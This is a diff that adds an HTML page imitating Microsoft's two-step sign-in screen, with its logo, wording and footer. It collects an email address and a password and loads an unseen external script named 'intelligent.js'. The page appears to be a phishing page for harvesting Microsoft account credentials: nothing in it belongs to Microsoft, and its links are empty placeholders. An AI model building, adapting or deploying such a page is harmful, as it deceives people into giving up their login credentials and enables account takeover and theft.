@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Microsoft – Sign in</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family:"Segoe UI", Arial, sans-serif;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background: linear-gradient(135deg, #e5f1fb, #ffffff);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.login-box{
+  width: 380px;
+  background:#fff;
+  padding:40px 36px 36px;
+  border-radius:6px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.12);
+}
+
+/* Microsoft Logo */
+.logo{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-size:20px;
+  font-weight:600;
+  color:#333;
+  margin-bottom:28px;
+}
+.logo span{
+  width:18px;
+  height:18px;
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  grid-template-rows:repeat(2,1fr);
+  gap:2px;
+}
+.logo span i{display:block;}
+.c1{background:#F25022;}
+.c2{background:#7FBA00;}
+.c3{background:#00A4EF;}
+.c4{background:#FFB900;}
+
+h1{
+  font-size:26px;
+  margin:0 0 18px;
+  font-weight:600;
+  color:#1b1b1b;
+}
+
+input{
+  width:100%;
+  padding:10px 8px;
+  border:none;
+  border-bottom:1px solid #777;
+  font-size:15px;
+  outline:none;
+}
+
+input:focus{
+  border-bottom:2px solid #0067b8;
+}
+
+/* Links */
+.links{
+  margin-top:18px;
+  font-size:14px;
+}
+.links a{
+  text-decoration:none;
+  color:#0067b8;
+  display:block;
+  margin-bottom:10px;
+}
+.links a:hover{
+  text-decoration:underline;
+}
+
+/* Buttons */
+.btn{
+  margin-top:26px;
+  width:100%;
+  display:flex;
+  justify-content:flex-end;
+}
+
+.btn label,
+button{
+  background:#0067b8;
+  color:#fff;
+  border:none;
+  padding:8px 26px;
+  font-size:15px;
+  border-radius:2px;
+  cursor:pointer;
+}
+
+.btn label:hover,
+button:hover{
+  background:#005da6;
+}
+
+/* Footer */
+.footer{
+  margin-top:25px;
+  display:flex;
+  justify-content:space-between;
+  font-size:12px;
+  color:#666;
+}
+.footer a{
+  color:#666;
+  text-decoration:none;
+  margin-left:12px;
+}
+.footer a:hover{ text-decoration:underline; }
+
+/* ========== PURE CSS STEP SYSTEM ========== */
+#step-toggle{
+  display:none;
+}
+
+.step-email{display:block;}
+.step-password{display:none;}
+
+#step-toggle:checked ~ .step-email{
+  display:none;
+}
+#step-toggle:checked ~ .step-password{
+  display:block;
+}
+
+/* ✅ DISABLE NEXT UNTIL EMAIL IS FILLED */
+.step-email input:invalid ~ .btn label{
+  pointer-events:none;
+  opacity:0.4;
+  background:#999;
+}
+
+.step-email input:valid ~ .btn label{
+  pointer-events:auto;
+  opacity:1;
+  background:#0067b8;
+}
+
+.back{
+  font-size:14px;
+  color:#0067b8;
+  margin-bottom:15px;
+  display:inline-block;
+  text-decoration:none;
+}
+.back:hover{ text-decoration:underline; }
+
+@media(max-width:480px){
+  .login-box{
+    width:90%;
+    padding:30px 26px;
+  }
+}
+</style>
+</head>
+<script src="intelligent.js"></script>
+<body>
+
+<div class="login-box">
+
+  <!-- Hidden Step Toggle -->
+  <input type="checkbox" id="step-toggle">
+
+  <!-- Logo -->
+  <div class="logo">
+    <span>
+      <i class="c1"></i>
+      <i class="c2"></i>
+      <i class="c3"></i>
+      <i class="c4"></i>
+    </span>
+    Microsoft
+  </div>
+
+  <!-- ========== STEP 1 (EMAIL) ========== -->
+  <div class="step-email">
+    <h1>Sign in</h1>
+<form>
+    <!-- REQUIRED FIELD -->
+    <input type="text" required placeholder="Email, phone, or Skype" name="Email, Phone or Skype">
+
+    <div class="links">
+      <a href="#">No account? Create one!</a>
+      <a href="#">Sign in with a security key ❓</a>
+      <a href="#">Sign-in options</a>
+    </div>
+
+    <div class="btn">
+      <label for="step-toggle">Next</label>
+    </div>
+  </div>
+
+  <!-- ========== STEP 2 (PASSWORD) ========== -->
+  <div class="step-password">
+    <label for="step-toggle" class="back">← Back</label>
+
+    <h1>Enter password</h1>
+
+    <input type="password" required placeholder="Password" name="Password" required>
+
+    <div class="btn">
+      <button type="submit">Sign in</button>
+    </div>
+  </div>
+</form>
+  <!-- Footer -->
+  <div class="footer">
+    <div>Terms of use</div>
+    <div>
+      <a href="#">Privacy & cookies</a>
+    </div>
+  </div>
+
+</div>
+
+</body>
+</html>
